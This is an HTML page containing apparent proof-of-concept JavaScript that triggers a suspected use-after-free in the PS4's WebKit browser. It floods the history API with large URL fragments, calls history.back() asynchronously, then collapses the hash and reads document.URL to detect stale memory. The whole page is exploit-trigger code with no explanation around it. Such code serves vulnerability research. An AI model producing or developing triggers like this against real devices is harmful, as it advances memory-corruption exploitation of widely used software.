
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Temporal Fragment UAF Probe</title>
<style>
body {
    font-family: monospace;
    background: #000;
    color: #0f0;
    padding: 20px;
}
button {
    font-size: 16px;
    padding: 12px 20px;
    margin-bottom: 15px;
}
#log {
    white-space: pre-wrap;
    font-size: 12px;
    border: 1px solid #0f0;
    padding: 10px;
    max-height: 500px;
    overflow-y: auto;
}
</style>
</head>
<body>

<h2>Temporal Fragment UAF – Minimal Confirmation Test</h2>
<button onclick="run()">RUN TEST</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";

    const BASE = 977;
    const STEP = 14461;
    let size = BASE;

    log("=== UAF TRIGGER START ===");

    // ----------------------------
    // Phase 1 — Known-good UAF trigger
    // ----------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(), 0);
            log("[ITER " + i + "] back() async");
        }
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");

    // ----------------------------
    // Phase 2 — Baseline read (NO allocations)
    // ----------------------------
    let url = document.URL;

    log("");
    log("=== BASELINE READ ===");
    log("URL.length = " + url.length);
    log("charCodeAt(32)  = " + url.charCodeAt(32));
    log("charCodeAt(64)  = " + url.charCodeAt(64));
    log("charCodeAt(128) = " + url.charCodeAt(128));
    log("charCodeAt(256) = " + url.charCodeAt(256));

    // ----------------------------
    // Phase 3 — Fragment collapse ONLY
    // ----------------------------
    log("");
    log(">>> FRAGMENT COLLAPSE <<<");
    location.hash = "#X";

    // *** CRITICAL: same-frame read ***
    let url2 = document.URL;

    log("");
    log("=== POST-COLLAPSE READ (SAME FRAME) ===");
    log("URL.length = " + url2.length);
    log("charCodeAt(32)  = " + url2.charCodeAt(32));
    log("charCodeAt(64)  = " + url2.charCodeAt(64));
    log("charCodeAt(128) = " + url2.charCodeAt(128));
    log("charCodeAt(256) = " + url2.charCodeAt(256));

    log("");
    log("=== TEST END ===");
}
</script>

</body>
</html>
